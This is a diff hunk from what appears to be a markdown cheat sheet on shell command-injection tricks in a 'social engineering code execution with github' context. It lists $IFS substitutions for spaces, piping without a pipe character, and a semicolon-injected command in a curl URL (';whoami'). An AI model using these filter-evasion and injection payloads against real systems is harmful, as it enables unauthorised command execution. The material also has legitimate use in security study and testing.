@@ -16,7 +16,7 @@ Social engineering code execution with github
 `a=('a');echo$IFS$a`  
 `echo$IFS$9a`  
 #### piping without pipes  
-`wc$IFS-l$IFS<$IFS<(ls)`     
+`wc -l < <(ls)`     
 #### starting code execution in unescaped url without ampersand
 `curl http://localhost/;whoami`
 #### redirecting to a hidden exploit  
